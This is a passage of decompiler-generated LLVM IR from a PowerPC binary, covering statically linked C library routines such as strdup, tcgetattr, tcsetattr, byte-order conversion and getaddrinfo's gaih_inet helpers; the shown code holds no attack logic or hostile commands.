  %v3_1001c4b0 = zext i8 %v2_1001c4b0 to i32
  %v1_1001c4b4 = add i32 %v0_1001c4b0, 1
  store i32 %v1_1001c4b4, i32* %r8.global-to-local, align 4
  %v0_1001c4b8 = load i32, i32* %r0.global-to-local, align 4
  %v4_1001c4b8 = icmp eq i32 %v0_1001c4b8, %v3_1001c4b0
  br i1 %v4_1001c4b8, label %dec_label_pc_1001c49c.backedge, label %dec_label_pc_1001c4c4

dec_label_pc_1001c49c.backedge:                   ; preds = %dec_label_pc_1001c49c, %dec_label_pc_1001c4c4, %dec_label_pc_1001c4d8
  %v0_1001c49c.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1001c49c

dec_label_pc_1001c4c4:                            ; preds = %dec_label_pc_1001c49c
  %v1_1001c4bc = mul nuw nsw i32 %v3_1001c4b0, 2
  %v0_1001c4c4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001c4c4 = load i32, i32* %r6.global-to-local, align 4
  %v2_1001c4c4 = add i32 %v1_1001c4c4, %v0_1001c4c4
  %v3_1001c4c4 = inttoptr i32 %v2_1001c4c4 to i16*
  %v4_1001c4c4 = load i16, i16* %v3_1001c4c4, align 2
  %v5_1001c4c4 = sext i16 %v4_1001c4c4 to i32
  store i32 %v5_1001c4c4, i32* %r9.global-to-local, align 4
  %v2_1001c4cc = add i32 %v1_1001c4c4, %v1_1001c4bc
  %v3_1001c4cc = inttoptr i32 %v2_1001c4cc to i16*
  %v4_1001c4cc = load i16, i16* %v3_1001c4cc, align 2
  %v5_1001c4cc = sext i16 %v4_1001c4cc to i32
  store i32 %v5_1001c4cc, i32* %r0.global-to-local, align 4
  %v4_1001c4d0 = icmp eq i16 %v4_1001c4c4, %v4_1001c4cc
  br i1 %v4_1001c4d0, label %dec_label_pc_1001c49c.backedge, label %dec_label_pc_1001c4d8

dec_label_pc_1001c4d8:                            ; preds = %dec_label_pc_1001c4c4
  %v3_1001c4c8 = icmp eq i8 %v2_1001c4b0, 0
  %v0_1001c4d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1001c4d8 = add i32 %v0_1001c4d8, 1
  store i32 %v1_1001c4d8, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r10.global-to-local, align 4
  store i32 %v1_1001c4d8, i32* %r8.global-to-local, align 4
  br i1 %v3_1001c4c8, label %dec_label_pc_1001c4e8, label %dec_label_pc_1001c49c.backedge

dec_label_pc_1001c4e8:                            ; preds = %dec_label_pc_1001c4d8
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1001c49c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001c49c.backedge, { 2, 1, 0 }
}

define i32 @__GI_strdup(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  %v0_1001c504 = call i32 @__GI_strlen()
  %v1_1001c508 = add i32 %v0_1001c504, 1
  store i32 %v1_1001c508, i32* @r29, align 4
  store i32 %v1_1001c508, i32* @r3, align 4
  store i32 268551444, i32* @lr, align 4
  %v0_1001c510 = call i32 @malloc()
  store i32 %v0_1001c510, i32* @r3, align 4
  %v0_1001c514 = load i32, i32* @r28, align 4
  store i32 %v0_1001c514, i32* @r4, align 4
  store i32 %v0_1001c510, i32* @r31, align 4
  %v3_1001c518 = icmp eq i32 %v0_1001c510, 0
  %v0_1001c51c = load i32, i32* @r29, align 4
  store i32 %v0_1001c51c, i32* @r5, align 4
  br i1 %v3_1001c518, label %dec_label_pc_1001c528, label %dec_label_pc_1001c524

dec_label_pc_1001c524:                            ; preds = %entry
  store i32 268551464, i32* @lr, align 4
  %v0_1001c524 = call i32 @memcpy()
  %v0_1001c52c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001c528

dec_label_pc_1001c528:                            ; preds = %entry, %dec_label_pc_1001c524
  %v0_1001c52c = phi i32 [ 0, %entry ], [ %v0_1001c52c.pre, %dec_label_pc_1001c524 ]
  ret i32 %v0_1001c52c

; uselistorder directives
  uselistorder label %dec_label_pc_1001c528, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_10045220.1186 to i32), i32* @r5, align 4
  %v1_1001c548 = call i32 @strtok_r(i32 ptrtoint (i32* @global_var_10045220.1186 to i32))
  ret i32 %v1_1001c548
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-72 = alloca i32, align 4
  store i32 268551520, i32* @lr, align 4
  %v2_1001c55c = call i32 @__GI_tcgetattr(i32* nonnull %stack_var_-72)
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32*)* @__GI_tcgetattr, { 1, 0 }
}

define i32 @__libc_tcdrain(i32 %arg1) local_unnamed_addr {
entry:
  store i32 1, i32* @r5, align 4
  store i32 536900637, i32* @r4, align 4
  %v0_1001c588 = call i32 @ioctl()
  ret i32 %v0_1001c588
}

define i32 @__GI_tcgetattr(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8 @__decompiler_undefined_function_4()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1001c590 = load i32, i32* @lr, align 4
  store i32 %v0_1001c590, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1001c5a0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1001c5a0, i32* @r5, align 4
  store i32 1076655123, i32* @r4, align 4
  store i32 268551604, i32* @lr, align 4
  %v0_1001c5b0 = call i32 @ioctl()
  %v2_1001c5b4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1001c5b4, i32* @r4, align 4
  store i32 %v0_1001c5b0, i32* @r30, align 4
  %v3_1001c5b8 = icmp eq i32 %v0_1001c5b0, 0
  store i32 19, i32* @r5, align 4
  %v0_1001c5c0 = load i32, i32* @r31, align 4
  br i1 %v3_1001c5b8, label %dec_label_pc_1001c5c8, label %dec_label_pc_1001c610

dec_label_pc_1001c5c8:                            ; preds = %entry
  %v1_1001c5c0 = add i32 %v0_1001c5c0, 17
  %v4_1001c5d4 = zext i8 %tmp4 to i32
  store i32 %v4_1001c5d4, i32* @r8, align 4
  %v3_1001c5e0 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_1001c5e0, i32* %r0.global-to-local, align 4
  %v2_1001c5e4 = add i32 %v0_1001c5c0, 4
  %v3_1001c5e4 = inttoptr i32 %v2_1001c5e4 to i32*
  store i32 %tmp7, i32* %v3_1001c5e4, align 4
  %v0_1001c5e8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001c5e8 = load i32, i32* @r31, align 4
  %v2_1001c5e8 = add i32 %v1_1001c5e8, 8
  %v3_1001c5e8 = inttoptr i32 %v2_1001c5e8 to i32*
  store i32 %v0_1001c5e8, i32* %v3_1001c5e8, align 4
  %v0_1001c5ec = load i32, i32* %r0.global-to-local, align 4
  %v1_1001c5ec = load i32, i32* @r31, align 4
  %v2_1001c5ec = inttoptr i32 %v1_1001c5ec to i32*
  store i32 %v0_1001c5ec, i32* %v2_1001c5ec, align 4
  %v0_1001c5f0 = load i32, i32* %r10.global-to-local, align 4
  %v1_1001c5f0 = load i32, i32* @r31, align 4
  %v2_1001c5f0 = add i32 %v1_1001c5f0, 12
  %v3_1001c5f0 = inttoptr i32 %v2_1001c5f0 to i32*
  store i32 %v0_1001c5f0, i32* %v3_1001c5f0, align 4
  %v3_1001c5f4 = load i32, i32* @r31, align 4
  %v4_1001c5f4 = add i32 %v3_1001c5f4, 16
  %v5_1001c5f4 = inttoptr i32 %v4_1001c5f4 to i8*
  store i8 %tmp4, i8* %v5_1001c5f4, align 1
  %v1_1001c5f8 = load i32, i32* @r31, align 4
  %v2_1001c5f8 = add i32 %v1_1001c5f8, 52
  %v3_1001c5f8 = inttoptr i32 %v2_1001c5f8 to i32*
  store i32 %tmp3, i32* %v3_1001c5f8, align 4
  %v1_1001c5fc = load i32, i32* @r31, align 4
  %v2_1001c5fc = add i32 %v1_1001c5fc, 56
  %v3_1001c5fc = inttoptr i32 %v2_1001c5fc to i32*
  store i32 %tmp2, i32* %v3_1001c5fc, align 4
  store i32 268551684, i32* @lr, align 4
  %v6_1001c600 = sext i8 %tmp4 to i32
  %v8_1001c600 = call i32 @__GI_mempcpy(i32 %v1_1001c5c0, i32 %v2_1001c5b4, i32 19, i32 %tmp2, i32 %tmp3, i32 %v6_1001c600, i32 %tmp7)
  store i32 %v8_1001c600, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 13, i32* @r5, align 4
  store i32 268551696, i32* @lr, align 4
  %v0_1001c60c = call i32 @__GI_memset()
  %v0_1001c614.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1001c610

dec_label_pc_1001c610:                            ; preds = %entry, %dec_label_pc_1001c5c8
  %v0_1001c614 = phi i32 [ %v0_1001c5b0, %entry ], [ %v0_1001c614.pre, %dec_label_pc_1001c5c8 ]
  store i32 %v0_1001c590, i32* %r0.global-to-local, align 4
  ret i32 %v0_1001c614

; uselistorder directives
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i8 %tmp4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1001c610, { 1, 0 }
}

define i32 @__GI_tcsetattr() local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1001c630 = load i32, i32* @r4, align 4
  %v3_1001c630 = icmp eq i32 %v0_1001c630, 1
  %v0_1001c638 = load i32, i32* @r3, align 4
  store i32 %v0_1001c638, i32* @r27, align 4
  %v0_1001c640 = load i32, i32* @r5, align 4
  store i32 %v0_1001c640, i32* @r31, align 4
  br i1 %v3_1001c630, label %dec_label_pc_1001c664, label %dec_label_pc_1001c648

dec_label_pc_1001c648:                            ; preds = %entry
  %v3_1001c648 = icmp eq i32 %v0_1001c630, 2
  br i1 %v3_1001c648, label %dec_label_pc_1001c684, label %dec_label_pc_1001c650

dec_label_pc_1001c650:                            ; preds = %dec_label_pc_1001c648
  %v3_1001c650 = icmp eq i32 %v0_1001c630, 0
  store i32 -2144570348, i32* @r30, align 4
  br i1 %v3_1001c650, label %dec_label_pc_1001c68c, label %dec_label_pc_1001c670

dec_label_pc_1001c664:                            ; preds = %entry
  store i32 -2144570347, i32* @r30, align 4
  br label %dec_label_pc_1001c68c

dec_label_pc_1001c670:                            ; preds = %dec_label_pc_1001c650
  %v0_1001c670 = call i32 @__errno_location()
  store i32 -1, i32* @r28, align 4
  %v2_1001c67c = inttoptr i32 %v0_1001c670 to i32*
  store i32 22, i32* %v2_1001c67c, align 4
  br label %dec_label_pc_1001c774

dec_label_pc_1001c684:                            ; preds = %dec_label_pc_1001c648
  store i32 -2144570346, i32* @r30, align 4
  br label %dec_label_pc_1001c68c

dec_label_pc_1001c68c:                            ; preds = %dec_label_pc_1001c650, %dec_label_pc_1001c664, %dec_label_pc_1001c684
  %v1_1001c68c = inttoptr i32 %v0_1001c640 to i32*
  %v2_1001c68c = load i32, i32* %v1_1001c68c, align 4
  store i32 19, i32* @r5, align 4
  %v1_1001c694 = add i32 %v0_1001c640, 4
  %v2_1001c694 = inttoptr i32 %v1_1001c694 to i32*
  %v3_1001c694 = load i32, i32* %v2_1001c694, align 4
  store i32 %v3_1001c694, i32* %r9.global-to-local, align 4
  %v1_1001c698 = add i32 %v0_1001c640, 17
  store i32 %v1_1001c698, i32* @r4, align 4
  %v1_1001c69c = add i32 %v0_1001c640, 8
  %v2_1001c69c = inttoptr i32 %v1_1001c69c to i32*
  %v3_1001c69c = load i32, i32* %v2_1001c69c, align 4
  %v2_1001c6a0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1001c6a0, i32* @r3, align 4
  %v2_1001c6a8 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1001c6a8, i32* @r26, align 4
  %v1_1001c6ac = add i32 %v0_1001c640, 16
  %v2_1001c6ac = inttoptr i32 %v1_1001c6ac to i8*
  %v3_1001c6ac = load i8, i8* %v2_1001c6ac, align 1
  %v4_1001c6ac = zext i8 %v3_1001c6ac to i32
  store i32 %v4_1001c6ac, i32* @r8, align 4
  store i32 %v2_1001c68c, i32* %stack_var_-72, align 4
  store i32 268551896, i32* @lr, align 4
  %v0_1001c6d4 = call i32 @memcpy()
  %v0_1001c6d8 = load i32, i32* @r27, align 4
  store i32 %v0_1001c6d8, i32* @r3, align 4
  %v0_1001c6dc = load i32, i32* @r30, align 4
  store i32 %v0_1001c6dc, i32* @r4, align 4
  store i32 %v2_1001c6a8, i32* @r5, align 4
  store i32 268551916, i32* @lr, align 4
  %v0_1001c6e8 = call i32 @ioctl()
  store i32 %v0_1001c6e8, i32* @r28, align 4
  %v3_1001c6ec = icmp eq i32 %v0_1001c6e8, 0
  br i1 %v3_1001c6ec, label %dec_label_pc_1001c6f4, label %dec_label_pc_1001c774

dec_label_pc_1001c6f4:                            ; preds = %dec_label_pc_1001c68c
  %v0_1001c6f4 = load i32, i32* @r30, align 4
  %v3_1001c6f8 = icmp eq i32 %v0_1001c6f4, -2144570348
  br i1 %v3_1001c6f8, label %dec_label_pc_1001c700, label %dec_label_pc_1001c770

dec_label_pc_1001c700:                            ; preds = %dec_label_pc_1001c6f4
  %v0_1001c700 = call i32 @__errno_location()
  store i32 %v0_1001c700, i32* @r29, align 4
  store i32 1076655123, i32* @r4, align 4
  %v0_1001c710 = load i32, i32* @r27, align 4
  store i32 %v0_1001c710, i32* @r3, align 4
  store i32 %v2_1001c6a8, i32* @r5, align 4
  %v1_1001c718 = inttoptr i32 %v0_1001c700 to i32*
  %v2_1001c718 = load i32, i32* %v1_1001c718, align 4
  store i32 %v2_1001c718, i32* @r30, align 4
  store i32 268551972, i32* @lr, align 4
  %v0_1001c720 = call i32 @ioctl()
  %v3_1001c724 = icmp eq i32 %v0_1001c720, 0
  br i1 %v3_1001c724, label %dec_label_pc_1001c734, label %dec_label_pc_1001c72c

dec_label_pc_1001c72c:                            ; preds = %dec_label_pc_1001c700
  %v0_1001c72c = load i32, i32* @r30, align 4
  %v1_1001c72c = load i32, i32* @r29, align 4
  %v2_1001c72c = inttoptr i32 %v1_1001c72c to i32*
  store i32 %v0_1001c72c, i32* %v2_1001c72c, align 4
  br label %dec_label_pc_1001c774

dec_label_pc_1001c734:                            ; preds = %dec_label_pc_1001c700
  %v0_1001c734 = load i32, i32* @r31, align 4
  %v1_1001c734 = add i32 %v0_1001c734, 8
  %v2_1001c734 = inttoptr i32 %v1_1001c734 to i32*
  %v3_1001c734 = load i32, i32* %v2_1001c734, align 4
  %v1_1001c73c = call i32 @__asm_rlwinm(i32 %v3_1001c734, i32 0, i32 19, i32 20)
  %v1_1001c740 = call i32 @__asm_rlwinm(i32 %v3_1001c69c, i32 0, i32 19, i32 20)
  store i32 %v1_1001c740, i32* %r9.global-to-local, align 4
  %v4_1001c744 = icmp eq i32 %v1_1001c73c, %v1_1001c740
  br i1 %v4_1001c744, label %dec_label_pc_1001c74c, label %dec_label_pc_1001c760

dec_label_pc_1001c74c:                            ; preds = %dec_label_pc_1001c734
  %v1_1001c74c = and i32 %v3_1001c734, 768
  store i32 %v1_1001c74c, i32* %r9.global-to-local, align 4
  %v3_1001c74c = icmp eq i32 %v1_1001c74c, 0
  br i1 %v3_1001c74c, label %dec_label_pc_1001c770, label %dec_label_pc_1001c754

dec_label_pc_1001c754:                            ; preds = %dec_label_pc_1001c74c
  %v1_1001c754 = call i32 @__asm_rlwinm(i32 %v3_1001c69c, i32 0, i32 22, i32 23)
  %v0_1001c758 = load i32, i32* %r9.global-to-local, align 4
  %v4_1001c758 = icmp eq i32 %v0_1001c758, %v1_1001c754
  br i1 %v4_1001c758, label %dec_label_pc_1001c770, label %dec_label_pc_1001c760

dec_label_pc_1001c760:                            ; preds = %dec_label_pc_1001c734, %dec_label_pc_1001c754
  store i32 -1, i32* @r28, align 4
  %v1_1001c768 = load i32, i32* @r29, align 4
  %v2_1001c768 = inttoptr i32 %v1_1001c768 to i32*
  store i32 22, i32* %v2_1001c768, align 4
  br label %dec_label_pc_1001c774

dec_label_pc_1001c770:                            ; preds = %dec_label_pc_1001c6f4, %dec_label_pc_1001c754, %dec_label_pc_1001c74c
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1001c774

dec_label_pc_1001c774:                            ; preds = %dec_label_pc_1001c68c, %dec_label_pc_1001c760, %dec_label_pc_1001c670, %dec_label_pc_1001c72c, %dec_label_pc_1001c770
  %v0_1001c778 = load i32, i32* @r28, align 4
  ret i32 %v0_1001c778

; uselistorder directives
  uselistorder i32 %v0_1001c640, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1001c774, { 4, 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_1001c770, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1001c760, { 1, 0 }
  uselistorder label %dec_label_pc_1001c68c, { 2, 1, 0 }
}

define i32 @ntohl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1001c78c = load i32, i32* @r3, align 4
  ret i32 %v0_1001c78c
}

define i32 @ntohs() local_unnamed_addr {
entry:
  %v0_1001c790 = load i32, i32* @r3, align 4
  ret i32 %v0_1001c790
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1001c794 = load i32, i32* @r3, align 4
  ret i32 %v0_1001c794
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1001c798 = load i32, i32* @r3, align 4
  ret i32 %v0_1001c798
}

define i32 @gaih_inet_serv(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1001c79c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1001c79c, i32* %stack_var_-64, align 4
  store i32 %arg1, i32* @r27, align 4
  %v0_1001c7b4 = load i32, i32* @r4, align 4
  store i32 %v0_1001c7b4, i32* @r30, align 4
  store i32 1024, i32* @r28, align 4
  %v2_1001c7e4 = ptrtoint i32* %stack_var_-52 to i32
  %v2_1001c7e8 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_1001c7c4

dec_label_pc_1001c7c4:                            ; preds = %dec_label_pc_1001c818.dec_label_pc_1001c7c4_crit_edge, %entry
  %v2_1001c7c8 = phi i32 [ %v2_1001c7c8.pre, %dec_label_pc_1001c818.dec_label_pc_1001c7c4_crit_edge ], [ %v4_1001c79c, %entry ]
  %v0_1001c7c4 = phi i32 [ %v0_1001c7c4.pre, %dec_label_pc_1001c818.dec_label_pc_1001c7c4_crit_edge ], [ 1024, %entry ]
  %v1_1001c7c4 = add i32 %v0_1001c7c4, 30
  %v1_1001c7cc = call i32 @__asm_rlwinm(i32 %v1_1001c7c4, i32 0, i32 0, i32 27)
  %v0_1001c7d0 = load i32, i32* @r28, align 4
  store i32 %v0_1001c7d0, i32* @r7, align 4
  %v0_1001c7d8 = load i32, i32* @r27, align 4
  store i32 %v0_1001c7d8, i32* %r3.global-to-local, align 4
  %v1_1001c7dc = load i32, i32* @r1, align 4
  %v3_1001c7dc = sub i32 %v1_1001c7dc, %v1_1001c7cc
  %v4_1001c7dc = inttoptr i32 %v3_1001c7dc to i32*
  store i32 %v2_1001c7c8, i32* %v4_1001c7dc, align 4
  %v0_1001c7e0 = load i32, i32* @r30, align 4
  %v1_1001c7e0 = add i32 %v0_1001c7e0, 3
  store i32 %v1_1001c7e0, i32* @r4, align 4
  store i32 %v2_1001c7e4, i32* @r5, align 4
  store i32 %v2_1001c7e8, i32* @r8, align 4
  %v1_1001c7f0 = add i32 %v3_1001c7dc, 23
  %v1_1001c7f4 = call i32 @__asm_rlwinm(i32 %v1_1001c7f0, i32 0, i32 0, i32 27)
  store i32 %v1_1001c7f4, i32* @r6, align 4
  store i32 268552188, i32* @lr, align 4
  %v1_1001c7f8 = call i32 @getservbyname_r(i32 %v1_1001c7f4)
  store i32 %v1_1001c7f8, i32* %r3.global-to-local, align 4
  %v3_1001c7fc = icmp eq i32 %v1_1001c7f8, 0
  br i1 %v3_1001c7fc, label %dec_label_pc_1001c808, label %dec_label_pc_1001c818

dec_label_pc_1001c808:                            ; preds = %dec_label_pc_1001c7c4
  %v3_1001c808 = load i32, i32* %stack_var_-56, align 4
  %v3_1001c80c = icmp eq i32 %v3_1001c808, 0
  br i1 %v3_1001c80c, label %dec_label_pc_1001c848, label %dec_label_pc_1001c820

dec_label_pc_1001c818:                            ; preds = %dec_label_pc_1001c7c4
  %v3_1001c800 = icmp eq i32 %v1_1001c7f8, 34
  br i1 %v3_1001c800, label %dec_label_pc_1001c818.dec_label_pc_1001c7c4_crit_edge, label %dec_label_pc_1001c848

dec_label_pc_1001c818.dec_label_pc_1001c7c4_crit_edge: ; preds = %dec_label_pc_1001c818
  %v0_1001c7c4.pre = load i32, i32* @r28, align 4
  %v2_1001c7c8.pre = load i32, i32* %stack_var_-64, align 4
  br label %dec_label_pc_1001c7c4

dec_label_pc_1001c820:                            ; preds = %dec_label_pc_1001c808
  %v1_1001c824 = load i32, i32* @r29, align 4
  %v2_1001c824 = inttoptr i32 %v1_1001c824 to i32*
  store i32 0, i32* %v2_1001c824, align 4
  %v0_1001c828 = load i32, i32* @r30, align 4
  %v1_1001c828 = inttoptr i32 %v0_1001c828 to i8*
  %v2_1001c828 = load i8, i8* %v1_1001c828, align 1
  %v2_1001c82c = sext i8 %v2_1001c828 to i32
  %v1_1001c830 = load i32, i32* @r29, align 4
  %v2_1001c830 = add i32 %v1_1001c830, 4
  %v3_1001c830 = inttoptr i32 %v2_1001c830 to i32*
  store i32 %v2_1001c82c, i32* %v3_1001c830, align 4
  %v0_1001c834 = load i32, i32* @r30, align 4
  %v1_1001c834 = add i32 %v0_1001c834, 2
  %v2_1001c834 = inttoptr i32 %v1_1001c834 to i8*
  %v3_1001c834 = load i8, i8* %v2_1001c834, align 1
  %v1_1001c838 = and i8 %v3_1001c834, 2
  %v3_1001c838 = icmp eq i8 %v1_1001c838, 0
  br i1 %v3_1001c838, label %dec_label_pc_1001c850, label %dec_label_pc_1001c840

dec_label_pc_1001c840:                            ; preds = %dec_label_pc_1001c820
  %v0_1001c840 = load i32, i32* @r26, align 4
  %v1_1001c840 = add i32 %v0_1001c840, 12
  %v2_1001c840 = inttoptr i32 %v1_1001c840 to i32*
  %v3_1001c840 = load i32, i32* %v2_1001c840, align 4
  br label %dec_label_pc_1001c858

dec_label_pc_1001c848:                            ; preds = %dec_label_pc_1001c818, %dec_label_pc_1001c808
  store i32 264, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001c86c

dec_label_pc_1001c850:                            ; preds = %dec_label_pc_1001c820
  %v1_1001c850 = add i32 %v0_1001c834, 1
  %v2_1001c850 = inttoptr i32 %v1_1001c850 to i8*
  %v3_1001c850 = load i8, i8* %v2_1001c850, align 1
  %v2_1001c854 = sext i8 %v3_1001c850 to i32
  br label %dec_label_pc_1001c858

dec_label_pc_1001c858:                            ; preds = %dec_label_pc_1001c840, %dec_label_pc_1001c850
  %storemerge = phi i32 [ %v3_1001c840, %dec_label_pc_1001c840 ], [ %v2_1001c854, %dec_label_pc_1001c850 ]
  %v1_1001c858 = load i32, i32* @r29, align 4
  %v2_1001c858 = add i32 %v1_1001c858, 8
  %v3_1001c858 = inttoptr i32 %v2_1001c858 to i32*
  store i32 %storemerge, i32* %v3_1001c858, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_1001c860 = load i32, i32* %stack_var_-56, align 4
  %v1_1001c864 = add i32 %v3_1001c860, 8
  %v2_1001c864 = inttoptr i32 %v1_1001c864 to i32*
  %v3_1001c864 = load i32, i32* %v2_1001c864, align 4
  %v1_1001c868 = load i32, i32* @r29, align 4
  %v2_1001c868 = add i32 %v1_1001c868, 12
  %v3_1001c868 = inttoptr i32 %v2_1001c868 to i32*
  store i32 %v3_1001c864, i32* %v3_1001c868, align 4
  %v0_1001c880.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001c86c

dec_label_pc_1001c86c:                            ; preds = %dec_label_pc_1001c848, %dec_label_pc_1001c858
  %v0_1001c880 = phi i32 [ 264, %dec_label_pc_1001c848 ], [ %v0_1001c880.pre, %dec_label_pc_1001c858 ]
  ret i32 %v0_1001c880

; uselistorder directives
  uselistorder label %dec_label_pc_1001c86c, { 1, 0 }
  uselistorder label %dec_label_pc_1001c858, { 1, 0 }
}

define i32 @gaih_inet(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-281 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-156 = alloca i8*, align 4
  %stack_var_-233 = alloca i32, align 4
  %stack_var_-256 = alloca i32, align 4
  %stack_var_-185 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1001c884 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1001c884, i32* %stack_var_-176, align 4
  %v5_1001c884 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v5_1001c884, i32* @r31, align 4
  %v2_1001c898 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_1001c898, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r27, align 4
  store i32 %arg1, i32* @r24, align 4
  store i32 %tmp, i32* @r28, align 4
  store i32 %arg4, i32* @r25, align 4
  %v1_1001c8ac = add i32 %arg3, 4
  %v2_1001c8ac = inttoptr i32 %v1_1001c8ac to i32*
  %v3_1001c8ac = load i32, i32* %v2_1001c8ac, align 4
  store i32 %v3_1001c8ac, i32* %r9.global-to-local, align 4
  store i32 %v2_1001c898, i32* %stack_var_-168, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-164, align 4
  %v3_1001c8bc = icmp eq i32 %v3_1001c8ac, 0
  br i1 %v3_1001c8bc, label %dec_label_pc_1001c8d0, label %dec_label_pc_1001c8c4

dec_label_pc_1001c8c4:                            ; preds = %entry
  %v3_1001c8c4 = icmp eq i32 %v3_1001c8ac, 10
  store i32 0, i32* @r21, align 4
  br i1 %v3_1001c8c4, label %dec_label_pc_1001c8d0, label %dec_label_pc_1001c8d8

dec_label_pc_1001c8d0:                            ; preds = %dec_label_pc_1001c8c4, %entry
  %v1_1001c8d0 = inttoptr i32 %arg3 to i32*
  %v2_1001c8d0 = load i32, i32* %v1_1001c8d0, align 4
  store i32 %v2_1001c8d0, i32* %r0.global-to-local, align 4
  %v1_1001c8d4 = call i32 @__asm_rlwinm(i32 %v2_1001c8d0, i32 29, i32 31, i32 31)
  store i32 %v1_1001c8d4, i32* @r21, align 4
  br label %dec_label_pc_1001c8d8

dec_label_pc_1001c8d8:                            ; preds = %dec_label_pc_1001c8c4, %dec_label_pc_1001c8d0
  store i32 %v2_1001c898, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  store i32 268552424, i32* @lr, align 4
  %v0_1001c8e4 = call i32 @__GI_memset()
  %v0_1001c8e8 = load i32, i32* @r27, align 4
  %v1_1001c8e8 = add i32 %v0_1001c8e8, 12
  %v2_1001c8e8 = inttoptr i32 %v1_1001c8e8 to i32*
  %v3_1001c8e8 = load i32, i32* %v2_1001c8e8, align 4
  store i32 %v3_1001c8e8, i32* %r11.global-to-local, align 4
  %v3_1001c8ec = icmp eq i32 %v3_1001c8e8, 0
  %v1_1001c900 = add i32 %v0_1001c8e8, 8
  %v2_1001c900 = inttoptr i32 %v1_1001c900 to i32*
  br i1 %v3_1001c8ec, label %dec_label_pc_1001c900, label %dec_label_pc_1001c8f4

dec_label_pc_1001c8f4:                            ; preds = %dec_label_pc_1001c8d8, %dec_label_pc_1001c900
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001c914

dec_label_pc_1001c900:                            ; preds = %dec_label_pc_1001c8d8
  %v3_1001c900 = load i32, i32* %v2_1001c900, align 4
  store i32 %v3_1001c900, i32* %r0.global-to-local, align 4
